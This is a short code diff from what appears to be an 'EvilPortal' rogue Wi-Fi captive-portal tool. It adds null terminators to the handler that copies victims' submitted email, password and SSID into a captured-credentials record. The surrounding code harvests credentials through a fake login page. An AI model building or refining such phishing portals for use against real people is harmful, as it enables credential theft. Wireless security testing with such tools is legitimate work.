@@ -592,14 +592,18 @@ void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
 
     if (request->hasParam("email", true)) {
         strncpy(cred.username, request->getParam("email", true)->value().c_str(), 64);
+        cred.username[63] = '\0';
     }
     if (request->hasParam("password", true)) {
         strncpy(cred.password, request->getParam("password", true)->value().c_str(), 64);
+        cred.password[63] = '\0';
     }
     if (request->hasParam("ssid", true)) {
         strncpy(cred.ssid, request->getParam("ssid", true)->value().c_str(), 32);
+        cred.ssid[31] = '\0';
     } else {
         strncpy(cred.ssid, s_instance->m_ssid, 32);
+        cred.ssid[31] = '\0';
     }
 
     cred.capturedMs = millis();
